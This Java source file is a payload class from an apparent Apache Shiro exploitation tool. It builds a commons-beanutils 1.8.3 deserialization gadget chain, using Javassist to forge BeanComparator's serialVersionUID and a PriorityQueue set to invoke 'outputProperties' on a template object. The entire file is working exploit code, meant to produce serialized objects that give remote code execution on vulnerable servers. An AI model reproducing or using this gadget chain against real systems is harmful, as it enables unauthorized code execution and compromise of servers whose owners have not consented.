package com.sma11new.exp.shiro.attack.payloads;

import com.sma11new.exp.shiro.attack.payloads.annotation.Authors;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.JavassistClassLoader;
import com.sma11new.exp.shiro.attack.util.Reflections;
import javassist.*;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

@Dependencies(value={"commons-beanutils:commons-beanutils:1.8.3"})
@Authors(value={"SummerSec"})
public class CommonsBeanutilsObjectToStringComparator_183
implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        } catch (NotFoundException ctSUID) {
            // empty catch block
        }
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "comparator", new ObjectToStringComparator());
        ObjectToStringComparator stringComparator = new ObjectToStringComparator();
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(stringComparator);
        queue.add(stringComparator);
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        return queue;
    }
}

